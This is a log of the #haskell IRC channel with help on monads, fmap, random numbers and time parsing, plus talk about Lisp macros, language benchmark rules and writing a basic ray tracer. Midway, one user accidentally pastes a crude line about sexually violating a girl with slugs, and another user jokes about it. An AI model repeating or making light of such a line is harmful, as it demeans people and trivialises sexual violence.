19:31:50 <SamB> I take heart in the fact that compilers seem to be the same way ;-)
19:33:04 <hpaste>  mae pasted "ok, i've decided, this is as much elegance effort i am putting into prepare ; )" at http://hpaste.org/6047
19:33:15 <BMeph> Does anyone know of some good books to read to figure out how to transform some imperative-style algorithms to a more functionally-friendly form?
19:35:04 <hpaste>  (anonymous) pasted "(no title)" at http://hpaste.org/6048
19:39:36 <wy> any ideas about implementing monads in Java?
19:40:25 <mae> oh man
19:40:28 <mae> its not hard
19:40:32 <mae> but it can't enforce it
19:41:02 <mae> this is an article about how to implement it in other languages, in particular this one is about ruby
19:41:04 <mae> http://moonbase.rydia.net/mental/writings/programming/monads-in-ruby/00introduction.html
19:41:05 <lambdabot> Title: Monads in Ruby, Part 1: Introduction - Moonbase, http://tinyurl.com/d725u
19:41:20 <newsham> is it possible to do monads in a strict language?
19:41:25 <mae> wait, does java have high order functions?
19:41:38 <wy> mae: unfortunately...
19:41:53 <Svrog> newsham: http://okmij.org/ftp/Scheme/monad-in-Scheme.html
19:41:53 <lambdabot> Title: Monads in Scheme
19:41:55 <wy> That might be a problem
19:42:32 <EvilTerran> mae, in a manner of speaking
19:42:47 <newsham> cant you just use an interface and methods for your higher order functions?
19:42:51 <EvilTerran> indeed
19:43:02 <newsham> ps: why not scala? :)
19:43:37 <mae> ah i see
19:44:10 <EvilTerran> public abstract class Delay<T> { private T val; public final T force () { if (val == null) val = action(); return val; }; protected abstract T action (); }
19:44:54 <EvilTerran> then use "new Delay<Integer> { protected Integer action () { ... } }" or whatever
19:45:44 <EvilTerran> you can have parameters if you don't mind the generics getting even sillier
19:45:46 <wy> oh, let me see if this can really save me something ;)
19:46:55 <EvilTerran> also you start having to litter your code with "final"s so you can use local variables in inner classes and whatnot. but that's probably a good idea anyway.
19:47:36 <mae> ok, how to generate random number or characters in haskell?
19:47:44 <mae>  i have to get with the monads i suppose..
19:49:06 <wy> EvilTerran: Is that the a->m b part?
19:49:22 <EvilTerran> wy, that was just laziness
19:51:12 <EvilTerran> public abstract class Monad<M> { public abstract <A> M<A> return (A x); public abstract <A,B> M<B> bind (M<A>, Lambda<A,M<B>>); ... } // is kinda what a monad would look like
19:51:24 <wy> let me see if I can use something simpler. I only need to pass the states
19:51:45 <EvilTerran> yeah, monads might be a bit generic
19:52:55 <mae> why does this not work in prelude
19:52:57 <mae> System.Random.getStdGen >>= System.Random.randoms
19:54:11 <mae> i'm probably doing something terribly wrong
19:54:18 <int-e> @type System.Random.randoms
19:54:22 <lambdabot> forall g a. (RandomGen g, Random a) => g -> [a]
19:54:37 <int-e>  System.Random.getStdGen >>= return . System.Random.randoms
19:54:51 <int-e> or liftM System.Random.randoms System.Random.getStdGen
19:55:05 <gnuvince_> :t liftM
19:55:06 <lambdabot> forall a1 r (m :: * -> *). (Monad m) => (a1 -> r) -> m a1 -> m r
19:57:03 <mae> ok tupid question, just what the heck is liftM again?
19:57:13 <shachaf> mae: Look at the type.
19:57:21 <shachaf> mae: It lifts a function into a monad.
19:57:45 <shachaf> For example, liftM (+1) [1,2,3] = [2,3,4], in [].
19:57:46 <mae> ohh
19:57:59 <EvilTerran> what's liftM? why, it's fmap of course!
19:57:59 <EvilTerran> :P
19:58:17 <int-e> you mean <$> :)
19:58:34 <newsham> ?src liftM
19:58:34 <lambdabot> liftM f m1 = do { x1 <- m1; return (f x1) }
19:58:42 <EvilTerran> int-e, no, that's `liftM` :P
19:59:00 <int-e> @src (<$>)
19:59:00 <lambdabot> f <$> a = fmap f a
19:59:06 <BMeph> ?ty System.Random.getStdGen
19:59:07 <lambdabot> IO StdGen
19:59:10 <shachaf> mae: You should (almost) always use fmap instead of liftM.
19:59:30 <int-e> Why, liftM is suggestive.
19:59:32 <shachaf> EvilTerran: It had better be fmap, anyway.
20:00:45 * dolio runs into a limitation of functional dependencies.
20:01:18 * BMeph hands dolio a whip and a chair, and hopes he can run back out...
20:01:26 <mae> excuse me but, shouldn't this work as well ?
20:01:38 <mae> System.Random.getStdGen >>= (\gen -> System.Random.randoms gen)
20:01:57 <EvilTerran> noo
20:01:59 <int-e> mae: no. \gen -> return (System.Random.randoms gen)
20:02:08 <EvilTerran> (\x -> f x) = (f)
20:02:17 <int-e> EvilTerran: wrong correction ;)
20:02:20 <mae> ah
20:02:28 <shachaf> int-e: That wasn't a correction.
20:02:33 <EvilTerran> int-e, it wasn't a correction, it's why it's wrong :P
20:02:36 <mae> because it has to have return to be a monad
20:03:09 <mae> i get it ; )
20:03:12 <olsner> where's monad either defined?
20:03:23 <int-e> mae: and \gen -> return (System.Random.randoms gen)  ==  return . System.Random.randoms   so you get my first suggestion.
20:03:27 <shachaf> olsner: Control.Monad.Error, I think?
20:04:15 <mae> so liftM is equivalent
20:04:20 <mae> to composing return with the function
20:04:29 <BMeph> Well, technically, since they're both wrong in the same way, "Yes, mae, the second form sould work the exact way that your first expression did." ;p
20:04:30 <shachaf> @src liftM
20:04:30 <lambdabot> liftM f m1 = do { x1 <- m1; return (f x1) }
20:04:40 <int-e> @undo do { x1 <- m1; return (f x1) }
20:04:40 <lambdabot> m1 >>= \ x1 -> return (f x1)
20:04:49 <shachaf> BMeph: EvilTerran was telling mae what mae's line meant.
20:05:04 <mae> yes i understand what both int-e and evilterran were saying
20:05:29 <mae> i am just grateful for all the warm brains synergizing with mine
20:05:29 <BMeph> shachaf: You mean, he was explaining eta reduction.
20:05:46 <SamB> mae: how do you know EvilTerran isn't a reptite?
20:05:47 <shachaf> BMeph: Yes. :-)
20:05:58 <SamB> reptites are terrans too!
20:06:13 <BMeph> mae: Yep, that's #haskell for you, many minds, living in syn (ergy). ;)
20:07:10 <cin> can someone login to this with user/pass:tester/tester and click the Poller link at the top left? http://rtfs.ath.cx/poller/login
20:07:17 <cin> you should have fromList [("username","tester")] at the bottom?
20:08:48 <lekro> cin: yes
20:08:56 <cin> lekro: woo!
20:09:01 <cin> lekro: thanks
20:09:16 <hpaste>  BMeph annotated "ok, i've decided, this is as much elegance effort i am putting into prepare ; )" with "Just a little more nitpicking, er "elegance"" at http://hpaste.org/6047#a1
20:09:16 <shachaf> cin: Here too.
20:09:24 <cin> shachaf: excellent
20:10:13 <mae> System.Random.getStdGen >>= return . take 10 . System.Random.randoms
20:10:14 <mae> woo
20:10:39 <dolio> Apparently data families don't do overlapping instances.
20:10:41 <shachaf> mae: Any reason you don't use fmap?
20:11:03 <mae> i'll look up fmap
20:11:05 <mae> @fmap
20:11:06 <lambdabot> http://www.haskell.org/hawiki/HaskellUserLocations
20:11:14 <BMeph> cin: I got "fromList [("username","tester")]" - sorry. :|
20:11:33 <BMeph> Oh, NM, that's what's supposed to happen. ;p
20:11:36 <cin> BMeph: :P
20:11:51 <cin> that's the, er, session data, and the bit below is your sessionid
20:13:55 <mae> can you give me the code how you would use fmap
20:13:57 <mae> i am not understanding
20:14:24 <cin> > fmap (+1) (Just 1)
20:14:24 <mae> similar to this
20:14:28 <lambdabot>  Just 2
20:14:31 <mae> hmm
20:14:59 <cin> @src maybe functor
20:14:59 <lambdabot> Source not found. Sorry.
20:15:04 <cin> @src functor maybe
20:15:04 <lambdabot> Source not found.
20:15:05 <cin> hm?
20:15:08 <mae> i know what maybe does..
20:15:19 <mae> i just don't know what fmap has to do with using random numbers
20:15:36 <mae> any way to make haskell generate random characters instead ? ; )
20:15:40 <int-e> @type randoms `fmap` getStdGen
20:15:41 <lambdabot> forall a. (Random a) => IO [a]
20:16:42 <int-e> > randoms (mkStdGen 42) :: String
20:16:43 <lambdabot>  "\41423\368463\206725\161530\914412\1094711\15230\345119\1035538\358835\8904...
20:17:10 <cin> > getStdRandom $ random :: IO Char
20:17:11 <lambdabot>  <IO Char>
20:18:25 <mae> very interesting
20:19:15 <cin> > whut <- getStdRandom $ random :: IO Char
20:19:15 <lambdabot>  Parse error at "<-" (column 6)
20:19:22 <cin> > do whut <- getStdRandom $ random :: IO Char
20:19:22 <lambdabot>  Parse error at end of input
20:19:31 <cin> hehe
20:19:33 <int-e> lambdabot doesn't run IO actionns
20:19:37 <EvilTerran> \b doesn't do IO
20:19:48 <EvilTerran> also, the last line of a do{} block has to be an action, not a bind
20:20:13 <cin> ja i know
20:29:15 <sneg__> hello. can someone enlighten me how you can use Data.Time to parse a date / time string?
20:29:18 <sneg__> i m very confused
20:33:00 <dbpatterson> sneg__: http://www.haskell.org/hoogle/hoodoc.cgi?module=Data.Time.Format&name=parseTime&mode=func
20:33:02 <lambdabot> http://tinyurl.com/3y6nmg
20:35:22 <sneg__> dbpatterson: yes but it wants ParseTime class which i dont know how to create
20:37:35 <dbpatterson> sneg__: ParseTime is one of ParseTime Day
20:37:35 <dbpatterson> ParseTime LocalTime
20:37:35 <dbpatterson> ParseTime TimeOfDay
20:37:35 <dbpatterson> ParseTime TimeZone
20:37:35 <dbpatterson> ParseTime UTCTime
20:37:47 <dbpatterson> and ParseTime ZonedTime
20:37:56 <dbpatterson> does that not work for you?
20:38:21 <sneg__> i m just confused how to get something like "23:55:04" into ParseTime
20:38:41 <sneg__> basically a String
20:39:02 <sneg__> apparently its got Read method implemented, but i dont know how to use it: )
20:39:57 <dbpatterson> you would do (parseTime "%H:%M:%S" "23:55:04") :: (Maybe TimeOfDay) I believe...
20:40:32 <Riastradh> Are there any comprehensive treatises on the design and use of numbers in Haskell?
20:47:26 <Cale> Riastradh: Well, there's the Report.
20:50:17 <OceanSpray> Oh my, Riastradh's in here.
20:51:17 <sebell> OceanSpray: I found a .hs at mumble.net/~campbell once... ;)
20:51:56 <OceanSpray> oh?
20:52:24 <sebell> (It was small Scheme interpreter IIRC, but still)
20:52:58 <sebell> *was a
20:53:06 <Riastradh> It might even still be there.
20:53:54 * EvilTerran watches Riastradh reach for the rm
20:54:55 <cin> http://mumble.net/~campbell/tmp/Scheme.hs
20:54:56 <cin> :P
20:56:11 <cin> Riastradh: what is that character on the line before each comment?
20:56:37 <Riastradh> What character?
20:56:46 <cin> it appears in firefox as 000C
20:56:51 <Riastradh> Oh, that's a page break.
20:57:03 <cin> oh, right
20:57:20 <gwern> @report
20:57:21 <lambdabot> ()
20:57:26 <gwern> ?report
20:57:26 <lambdabot> ()
20:57:28 <EvilTerran> ?where report
20:57:28 <lambdabot> http://www.haskell.org/onlinereport/
20:57:33 <EvilTerran> ?help report
20:57:33 <lambdabot> help <command>. Ask for help for <command>. Try 'list' for all commands
20:57:45 <EvilTerran> ?list report
20:57:45 <lambdabot> No module "report" loaded
20:57:50 <EvilTerran> hm
20:58:06 <gwern> thanks. actually, what I need to know is - if a -- comment is indented, is it still strictly considered to be a comment? (in a .hs file)
20:58:10 <gwern> and what about .cabal files?
20:58:32 <allbery_b> -- can occur anywhere in a line, in haskell
20:58:45 <allbery_b> everything following to end of line is a comment
20:59:25 <gwern> OK, but what about cabal files? it would seem to not follow the same principle, at least by my reading of 'In the package description file, lines beginning with "--" are treated as comments and ignored.'
20:59:43 <gwern> (it doesn't say, 'any amount of whitespace followed by '--'..., if you follow)
21:01:16 <OceanSpray> but that can be inferred.
21:01:25 <OceanSpray> programmers != lawyers.
21:02:04 <gwern> OceanSpray: well, haskell-mode doesn't treat indented -- in cabal files as being comments, and before I email stefan, I'd like to be sure cabal files are supposed to follow the .hs convention
21:02:08 * Tac-Tics2 tries to appeal to his code's pathos to get it to work
21:02:25 <OceanSpray> oh?
21:02:27 * sorear mumbles at the shared name
21:02:57 <OceanSpray> haskell-mode for emacs has a few kinks to work out.
21:03:43 <OceanSpray> I've been wondering.
21:03:57 <cin> i've noticed it indents 'then' and 'else' wrongly sometimes; aligns it up with the `if`'s column
21:04:09 <OceanSpray> Would Haskell really benefit from having sexpr syntax?
21:04:20 <OceanSpray> I mean, Liskell's cool and all, but...
21:04:24 <gwern> OceanSpray: liskell's author apparently thought so
21:04:26 <Riastradh> That depends on how you exploit the syntax, OceanSpray.
21:04:43 <tehgeekmeister> write yourself a scheme in 48 hours says that constructors from type synonyms are curried, and hence can be partially applied, but the haskell report says this is a static error -- what's the truth?
21:04:52 <gwern> although I truthfully haven't come across anything which actually used liskell, so...
21:05:24 * tehgeekmeister tests to see if he can see any messages including his own now
21:05:27 <tehgeekmeister> i can!
21:05:37 <cin> editing haskell code makes my hands hurt. editing sexprs didn't. it's kind of cumbersome in comparison but i expect my experience will be like that for all languages with irregular syntax (ie most popular ones)
21:05:43 <Riastradh> tehgeekmeister, there are many poorly conceived or misleading aspects of that tutorial.  The truth is that they are not in the Haskell report but supported by GHC with the appropriate set of flags for non-standard extensions.
21:06:24 <tehgeekmeister> Riastradh: gah, i wish i'd known it could be misleading before i started it.  luckily much of what i've learned i learned elsewhere first.
21:06:39 <ddarius> I don't believe you can partially apply type synonyms with any extensions otherwise I'm writing a lambda calculus interpreter in the type system without type classes.
21:06:51 <ddarius> You can, though, write type MyMonad = IO if you want.
21:06:51 <Riastradh> tehgeekmeister, you may, for instance, come out with a spectacularly misguided idea of Scheme after that tutorial.
21:07:36 <Riastradh> ddarius, ah, excuse me; I may be mistaking a reference long ago to an idea for a reference long ago to an actual implementation.
21:07:55 <tehgeekmeister> Riastradh: that's not so tragic in my case, however it should be avoided when writing a tutorial.  i intend to read a few scheme books after this anyway, so they should correct any misconceptions
21:08:17 <tehgeekmeister> well, a simple way to check: see if my code works, because it has a partially applied type synonym
21:08:24 <tehgeekmeister> err, maybe i should clarify
21:08:29 <tehgeekmeister> the example is:
21:08:39 * dolio doesn't see the connection between s-expressions and hands hurting.
21:08:43 <Riastradh> tehgeekmeister, it is woefully incomplete, because it was a hack of an hour or two after which I lost interest, but in response to that tutorial I wrote <http://mumble.net/~campbell/tmp/Scheme.hs>, to clarify a Haskell interpretation of the semantics of Scheme.
21:09:00 <tehgeekmeister> type ThrowsError = Either LispError
21:09:10 <tehgeekmeister> that's what the tutorial is calling a partially applied constructor
21:09:19 <cin> dolio: i said editing them didn't make my hands hurt
21:09:22 <tehgeekmeister> which may not be what i got across with my description
21:11:40 <OceanSpray> hm.
21:12:10 <OceanSpray> has anybody here used template haskell?
21:12:41 <tehgeekmeister> Riastradh: hmm, that should be worth a look after i'm done with this tutorial.  i'm at a slow point in my attempt to learn haskell, most things seem either far too challenging or so simple as to be uninteresting and not worthwhile...  but that's a tangent.
21:13:01 <gwern> OceanSpray: I used it once trivially for getting a compile-time constant
21:13:20 <swidgy> tehgeekmeister: "type" doesn't create a type constructor, to my knowledge.  it's just a synonym, no?
21:13:33 <siti> yes
21:13:51 <tehgeekmeister> swidgy: from what i understand that's correct, which leaves me uncertain as to the exact semantics.
21:14:13 <EvilTerran> OceanSpray, a bit
21:14:22 <OceanSpray> it seems that few people require extensive meta-programming in a language like Haskell.
21:14:26 <OceanSpray> EvilTerran, oh?
21:14:30 <OceanSpray> what was it like?
21:14:34 <EvilTerran> clunky
21:14:37 <OceanSpray> ..
21:14:47 <EvilTerran> you can't splice everywhere you'd like
21:14:52 <EvilTerran> and there's no quasiquotes for patterns
21:14:56 <Riastradh> Template Haskell is intended only for compile-time calculations, not for extension of the language.
21:15:17 <EvilTerran> so you end up using the constructors directly quite a lot, which is a world of pain
21:16:26 <OceanSpray> Riastradh, lend me your wisdom.
21:16:47 <OceanSpray> when people use macros in lisp,
21:16:50 <EvilTerran> but you can do some clever stuff with it. i only wish it were easier. =/
21:17:12 <OceanSpray> do they often have side-effect related objectives?
21:17:36 <Riastradh> It is a mistake to perform any side effects in a macro transformer, if that is what you are asking.
21:17:42 <Riastradh> (generally)
21:17:47 <OceanSpray> huh.
21:18:02 <EvilTerran> OceanSpray, they use 'em 'cos they don't have laziness and such, as i see it
21:18:14 <OceanSpray> that's what I was thinking.
21:18:18 <EvilTerran> a lot of the time, it's to delay a computation in one way or another
21:18:39 <Riastradh> No, those are the frivolous macros one often finds in Common Lisp.
21:18:45 <Riastradh> Those are not the interesting macros at all.
21:18:52 <OceanSpray> perhaps Haskell's lazy evaluation scheme and lack of variables cut down on the number of instances in which one would want a macro.
21:18:56 <EvilTerran> they're still macros...
21:19:11 <EvilTerran> OceanSpray, cut down, yes, but sadly not eliminate
21:19:15 <Riastradh> Let me give an example that was recently mentioned here in this channel.
21:19:32 <Riastradh> When writing Scheme.hs, I often wanted to extract patterns of a *mutable* data structure.
21:19:41 <Riastradh> But Haskell has a fixed, rigid pattern notation.
21:19:55 <OceanSpray> ah, the lack of first-class patterns
21:19:55 <EvilTerran> macros are just another way of improving the inevitably limited expressibility of a language
21:20:06 <OceanSpray> that's a problem I've encountered when writing my interpreter, too.
21:20:23 <Riastradh> One cannot introduce new binding constructs in Haskell, so one cannot introduce a pattern notation for mutable data structures, since they intrinsically require what cannot happen in an ordinary Haskell pattern.
21:21:50 <EvilTerran> but you can introduce pattern-matching constructs in lisp?
21:21:57 <Riastradh> Certainly.
21:22:02 <EvilTerran> (i imagine so)
21:22:24 <EvilTerran> i'd agree that qualifies as somewhat more interesting than delaying computation
21:22:52 <EvilTerran> but is it in the standard libraries? it strikes me as useful enough that to have a million different implementations would be a pain
21:23:07 <Riastradh> Pattern notations, or other binding constructs?
21:23:21 <OceanSpray> theoretically, everywhere you find yourself writing pieces of code with parametric similarity, you can use a macro.
21:23:27 <EvilTerran> pattern-matching. particularly on algebraic types, i guess.
21:23:40 <Riastradh> There are zillions of approaches to pattern matching, because there are so many choices one can be made when one has more than just algebraic data types.
21:23:42 <EvilTerran> for that, you'd first need algebraic types...
21:23:51 <Riastradh> `Choices *that* can be made', I mean.
21:24:00 <EvilTerran> i see your point
21:24:31 <EvilTerran> and raise you ANOTHER ONE!
21:24:34 <EvilTerran> Riastradh++
21:24:43 <EvilTerran> ... i'm getting manic. i should go to bed.
21:24:44 <OceanSpray> oy, what's pattern matching but applying an inverse function and checking its domain?
21:24:55 <EvilTerran> g'night folks
21:25:19 <Riastradh> Sometimes this is necessary to solve different classes of problems.  For example, sometimes one wants a locally pattern-directed decision, but perhaps sometimes one wants a dynamically extensible database of pattern-directed rules.
21:25:50 <Riastradh> The former one can globally optimize easily; on the latter might impose some expressive constraints for the sake of performance.
21:26:05 <Riastradh> `On the latter *one* might impose', even.  Grr.
21:26:13 <OceanSpray> It's late at night.
21:26:45 <gwern> @seen sm
21:26:45 <lambdabot> I saw sm leaving #haskell and #darcs 9h 52m 53s ago, and .
21:26:51 <Riastradh> Conceptually that may be a general description of all cases of `pattern matching', but a general description of the problem is not in general a solution to specific problems.
21:26:52 <OceanSpray> and .
21:26:57 <Riastradh> ...ergh.
21:27:03 <Riastradh> `That' there is what OceanSpray mentioned a moment ago.
21:27:08 <gwern> @tell sm any news on the license for fungen/the new version?
21:27:08 <lambdabot> Consider it noted.
21:27:11 <Riastradh> Perhaps I ought to go to bed.  I'm dropping words left and right.
21:27:30 <OceanSpray> Perhaps, east coaster.
21:27:51 <OceanSpray> Meanwhile, I'm going to enjoy the internets for another few hours here in Los Angeles.
21:28:10 <OceanSpray> ...typing coherently, of course.
21:28:32 <OceanSpray> MARVEL AT MY IMPECCABLE FINGER DEXTERITY!
21:28:59 <Riastradh> It is indeed impressive how completely you failed to lift your pinky from the shift key.
21:29:16 <OceanSpray> Caps lock, man.
21:29:35 <Riastradh> What's that?
21:29:36 <dolio> Caps lock?
21:29:39 <gwern> @pl safeSpawn prog arg = liftIO (try (doubleFork $ executeFile prog True [arg] Nothing) >> return ())
21:29:39 <lambdabot> safeSpawn = (liftIO .) . flip flip (return ()) . (((>>) . try . doubleFork) .) . flip flip Nothing . (. return) . flip executeFile True
21:29:56 <gwern> the goggles. they do nothing
21:30:01 <OceanSpray> It is indeed an underutilized key.
21:30:15 <cin> continuations in web development. what's all that about?
21:30:35 <gwern> cin: nice handling of a transaction's state, iirc
21:31:39 <sebell> cin: What's with cab drivers? It seems like the only requirement to drive a cab is that you have to have a face to put on the license!
21:31:42 <cin> gwern: i'm considering giving it a try with contT
21:32:11 <cin> sebell: tell me about it. my dad's a cab driver and he watches Coronation Street
21:32:22 <siti> lol
21:32:45 <siti> that has to be the worst show on earth
21:32:48 <OceanSpray> <VTEC_Gundam> Could a girl survive having slugs stuffed into her vagina?
21:32:55 <OceanSpray> oh shit
21:33:00 <OceanSpray> sorry about that.
21:33:00 <sebell> cin: And what's with airplane bathrooms? Do you really need the razor receptable? I mean, who shaves on an airplane -- let alone shaves enough to wear out a razor blade?
21:33:26 <gwern> OceanSpray: why not? are slugs poisonous or something?
21:33:28 <dolio> So we're quoting Seinfeld standup now?
21:33:52 <cin> dolio: yeah, quoting Seinfeld, what's with that?
21:34:07 <OceanSpray> #Haskell - It's a language about NOTHING!
21:34:10 <cin> dolio: i mean, who even watches Seinfeld?
21:34:31 <gwern> OceanSpray: if a program never does IO, did it compute anything?
21:34:34 <dolio> I used to.
21:34:48 <ac> gwern: do we care?
21:35:10 <dolio> Not as much anymore, though, since I've seen pretty much every episode several times by now.
21:36:15 * gwern guesses ac didn't like  my joke
21:36:18 <allbery_b> gwern: IIRC the rules of the debian shootout got changed because the haskell entry for one problem proved it didn't :)
21:36:19 <cin> dolio: wow. i really do not like that show, but as i understand it, it's one of the biggest comedy shows, or was, in the us
21:36:40 <allbery_b> (they forgot to specify that the result be printed, so ghc neatly optimized away the entire calculation)
21:36:53 <gwern> allbery_b: yes, I heard that. amazing how busy loops can be optimized away
21:37:32 <swidgy> cin: it was a sign of the times.  i can't stand it now, but i'll admit i enjoyed it during it's run
21:37:47 <swidgy> s/it's/its
21:46:57 <wli> allbery_b: The rules of the sootout proved what?
21:49:18 <dolio> If you don't do IO, you don't compute anything.
21:52:03 <allbery_b> at least in lazy languages like haskell
21:52:27 <wli> I have to wonder what their POV is that has them changing the rules so consistently "against Haskell."
21:53:00 <allbery_b> in every case I've heard of, Haskell broke their model
21:53:21 <dolio> Occasionally not just Haskell.
21:53:23 <wli> Could you clarify and elaborate?
21:53:27 <allbery_b> that is, they made assumptions that simply don't work when in Haskell
21:53:29 <allbery_b> such as the "don'
21:54:10 <allbery_b> t do output" issue, and IIRC there was something where the Haskell program used a data structure they weren't expecting
21:55:12 <allbery_b> (and that C++, etc. couldn't match without importing lots of extra libraries)
21:55:27 <wli> In slow motion, the "don't do output" issue puts Haskell in a situation where the bulk of the desired computation is never forced, and the second you'll need to clarify further for me.
21:55:42 <allbery_b> sadly I don't recall the details
21:56:00 <wli> What it means at a high level will do.
21:56:54 <siti> it would be nice if the shootout was 64bit, ghc would do quite a bit better then :)
21:57:07 <gwern> allbery_b: aw. I hadn't heard the datastructure one
21:57:11 <Trinithis> is there a way to do: data (Eq a) => EqList a = [a]
21:57:12 <allbery_b> but what it came down to was the Haskell base libraries (containers library, these days) contained something that was ideally suited to the program and which would have needed to be written from scratch (probably unoptimized) or required an external library.  (an example which may or may not have been the one in qiestion:  fingertrees, as found in Data.Map)
21:57:18 <wli> Did it run faster as a result of the data structure? Did it avoid a bunch of computation because of it?
21:57:24 <Trinithis> i mean with: type (Eq a) => EqList a = [a]
21:57:39 <OceanSpray> but how would that violate the rules?
21:57:52 <OceanSpray> I mean, isn't the "shootout" supposed to demonstrate advantages like these?
21:57:56 <wli> It didn't, so they had to change the rules.
21:58:00 <dolio> Are you thinking of the prime sieve?
21:58:06 <allbery_b> I might be
21:58:30 <dolio> The haskell entry was disqualified because UArray Bool is bit packed.
21:58:34 <allbery_b> I've not been involved with thew shootout, just seen dons & co. discussing various issues that have come up
21:58:39 <dolio> I think a C++ entry was disqualified for the same reason.
21:58:42 <allbery_b> a search of the #haskell logs would find it
21:58:45 <allbery_b> ah
21:58:55 <allbery_b> that does sound familiar
21:58:58 <dolio> So they were way faster than most other languages.
21:59:13 <siti> that's silly
21:59:28 <dolio> Another data structure one that comes to mind is binary trees, which was supposed to stress the garbage collection or allocation or something like that.
21:59:39 <allbery_b> as for OceanSpray's comment:  no, not really, they're supposed to start out in the same ballpark
21:59:40 <wli> So they essentially wanted a prime sieve operating on lists?
21:59:55 <dolio> But since the haskell trees were lazy, they didn't allocate significant amounts of memory at any given time.
22:00:12 <allbery_b> all be doing roughly the same operations, not highlighting their own specific advantages
22:00:55 <allbery_b> (not saying such a shootout wouldn't be interesting, it's just not what the Debian Language Shootout was intended to bench)
22:01:11 <dolio> Well, they wanted an array of bools where the bool indicated if the index was a prime.
22:01:37 <dolio> They just wanted the array to use a byte per bool instead of a bit, or something. :)
22:03:44 <dolio> The unaccepted haskell program is still the fastest one on that particular benchmark.
22:04:03 <dolio> The unaccepted C++ one is second.
22:04:48 <lekro> dolio: is the code for both still available somewhere?
22:05:04 <dolio> Yeah, it's all there.
22:05:08 <dolio> http://shootout.alioth.debian.org/gp4/benchmark.php?test=nsieve&lang=all
22:05:10 <lambdabot> Title: nsieve benchmark | Gentoo : Intel&#174; Pentium&#174;&nbsp;4 Computer Language B ..., http://tinyurl.com/ncjpk
22:05:12 * wli is still collecting shootout ideas at http://holomorphy.com/~wli/shootout.html
22:05:12 <lambdabot> Title: Programming Language Shootout Thoughts
22:06:04 <lekro> dolio: thanks
22:06:19 <OceanSpray> "Welcome to Pseudocode!"
22:06:30 <OceanSpray> "This this series of articles [...]"
22:09:04 <lekro> is nsieve-bits the same as nsieve except that the former allows bit arrays (and possibly different test cases)? because there the C++ version is still faster
22:09:34 <lekro> interestingly tough, it is not relying on vector<bool>
22:10:47 <lekro> +h
22:11:05 <wli> lekro: Yes. So the ghc code for nsieve could be used for nsieve-bits
22:13:06 <dolio> That certainly is odd.
22:15:24 * wli put a couple of plausible shootout problems at http://holomorphy.com/~wli/shootout/
22:15:25 <lambdabot> Title: wli's programming language shootout
22:20:09 * wli hasn't exactly been flooded by submissions.
22:24:13 * wli drops a pin.
22:27:54 <shepheb> wli: it's late in North America and too early in Europe. patience.
22:28:21 <wli> Just a minute ago there was all sorts of shootout chatter.
22:32:34 * allbery_b has no business still being awake
22:32:46 <allbery_b> nut that's what happens when I crash and nap for 6 hours in the middle of the day
22:32:51 <allbery_b> *but
22:33:11 <wli> allbery_b: Any chance of some sort of comment on the shootout stuff thus far?
22:34:34 <allbery_b> I'll look, but I've been more or less brainless all day so can't promise anything useful
22:35:06 <wli> allbery_b: It's not too involved. Mostly "how things should be" sorts of commentary to begin with.
22:37:13 <allbery_b> hm, actually, whatever happened to dons' Haskell shootout?  although I think that's not suitable for this either because all implementations have to use the same source, which makes non-Haskell entries dicey :)
22:37:34 <allbery_b> (that said, I think he got some pre-Haskell languages in there at one point)
22:37:48 <wli> Not sure what happened to dons' thing.
22:38:02 <wli> ISTR dons said he wanted to see something like what I was talking about happen.
22:38:11 <wli> And that he might just do it himself.
22:38:18 <allbery_b> yeh
22:38:24 <allbery_b> then he went to work for galois :)
22:38:34 <wli> I never heard about the shootout between Haskell implementations.
22:38:54 <allbery_b> maybe he can talk them into supporting it
22:39:24 * allbery_b notes his tired/braindead-ness:  he initially wrote "maybe they can talk him into..." and had to reread 4x to realize what was wrong
22:39:45 <wli> Mostly I'd need a webmonkey to slap up prettier-looking or more useful webpages.
22:41:06 <wli> Maybe some more language coverage by hammering out solutions in more languages (Ocaml, Oz, Curry, Clean, Mercury, etc.).
22:41:24 <wli> Throw in Cayenne, too, while we're at it. ;)
22:42:28 <allbery_b> here it is, sadly it died shortly after it started :( http://www.cse.unsw.edu.au/~dons/nobench.html
22:42:29 <lambdabot> Title: nobench : benchmarking Haskell implementations
22:42:40 <wli> The most I can think of for support is (a) absorbing the web traffic bills and (b) maybe throwing a bigger box at it for benchmarking e.g. parallel code.
22:43:07 <allbery_b> you missed the most important part:  developer time
22:43:23 <OceanSpray> allbery_b, that is irrelevant in this case.
22:43:34 <OceanSpray> we are benchmarking implementations of the same language.
22:44:00 <allbery_b> hrm?  no, nobench was a sidetrack.  I mean wli's alternative shootout
22:44:03 <wli> allbery_b: Very important but very hard to get useful information about.
22:44:20 <OceanSpray> oh
22:44:35 <OceanSpray> I'm sure there are plenty of scientific surveys, no?
22:44:46 <allbery_b> most useful would be somethng like google's (former?) thing where 20% of an employee's time could be spent on their own projects with the proviso that if google liked it they might adopt it
22:46:25 <wli> OceanSpray: Fewer than you'd think. There's not much interest in it. Programming languages are adopted largely on the basis of squishy factors like trendiness and perception of being well-established (esp. into the future).
22:46:59 <OceanSpray> ...and entrenchment in popular industry psyche.
22:47:40 <wli> At the rate we're going we'll be the "second dismal science" right beside economics.
22:48:16 <OceanSpray> Programming languages tend to either form natural monopolies or reduce down to monopolistic competition within narrow paradigms.
23:17:16 <OceanSpray> I feel stupid for not being able to write a ray-tracer cold turkey.
23:18:24 <rue> 'S not so bad, some people just cannot *stop* writing ray tracers cold turkey
23:19:13 <OceanSpray> seriously though, everybody said it was easy,
23:19:57 <OceanSpray> so I thought "ha! I don't need no freakin' guidance! I'll just figure out the algorithm meself!"
23:20:05 <OceanSpray> urgh.
23:23:27 <ddarius> Do a loop over the pixels of the screen.  Make a vector from a "camera" point to the pixel (by envisioning it to be on a plane in front of the camera).  Normalize.  Calculate the ray-sphere intersection (say, spheres are an easy thing to start with).  If it hits, mark that pixel, otherwise leave it blank.
23:26:02 <OceanSpray> hm.
23:26:06 <OceanSpray> spheres, you say?
23:26:44 <ddarius> Spheres and (infinite) planes are the simplest things.
23:26:48 <ac> there's a reason why everybody's toy ray tracers render spheres
23:26:56 <ddarius> Cylinders are easy too.
23:27:16 <OceanSpray> It seems that I was biting off more than I could chew.
23:28:19 <wagle_home> lots of matrix math, and intersections of lines with various shapes
23:28:19 <ddarius> If you are not handy with vector algebra it can get a bit more involved.
23:28:43 <ddarius> wagle_home: You only need linear algebra later.
23:28:57 <OceanSpray> well, I'm currently in AP Calc, so I should know this stuff already.
23:29:19 <ddarius> I was only taught vector stuff in physics.
23:29:42 <ddarius> But, yes, the math is very straightforward for a very basic raytracer.
